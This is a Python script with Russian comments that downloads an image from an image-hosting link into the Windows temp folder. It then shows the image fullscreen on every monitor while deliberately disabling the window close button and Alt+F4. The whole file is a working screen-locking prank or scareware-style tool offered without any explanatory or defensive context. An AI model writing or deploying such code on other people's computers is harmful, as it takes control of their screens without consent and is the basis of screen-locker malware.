import tkinter as tk
from PIL import Image, ImageTk
import requests
import os
from screeninfo import get_monitors  # Импортируем get_monitors из screeninfo

def download_image(url, file_path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(file_path, 'wb') as file:
            file.write(response.content)
        print("Изображение скачано:", file_path)
        return True
    else:
        print("Ошибка загрузки изображения")
        return False

def show_fullscreen_image_on_all_monitors(image_path):
    monitors = get_monitors()  # Получаем информацию о всех подключенных мониторах
    print(f"Количество мониторов: {len(monitors)}")

    for monitor in monitors:
        root = tk.Tk()
        root.attributes('-fullscreen', True)  # Полноэкранный режим
        root.protocol("WM_DELETE_WINDOW", lambda: None)  # Блокировка кнопки закрытия

        # Получаем размеры экрана
        screen_width = monitor.width
        screen_height = monitor.height
        screen_x = monitor.x  # Позиция монитора по оси X
        screen_y = monitor.y  # Позиция монитора по оси Y

        # Загрузка изображения и изменение размера под экран
        img = Image.open(image_path)
        img = img.resize((screen_width, screen_height), Image.LANCZOS)
        photo = ImageTk.PhotoImage(img)

        # Создание метки с изображением
        label = tk.Label(root, image=photo)
        label.pack()

        # Устанавливаем положение окна на соответствующий монитор
        root.geometry(f"+{screen_x}+{screen_y}")  # Устанавливаем окно на позицию монитора

        # Блокировка Alt+F4
        root.bind("<Alt-F4>", lambda e: None)

        # Запуск окна
        root.mainloop()

# Ссылка на изображение в интернете
image_url = "https://i.ibb.co/xm82j5P/1.jpg"

# Путь для сохранения изображения (в папке временных файлов)
image_path = os.path.join(os.getenv("TEMP"), "fullscreen_image.jpg")

# Скачивание изображения и показ его на всех экранах
if download_image(image_url, image_path):
    show_fullscreen_image_on_all_monitors(image_path)
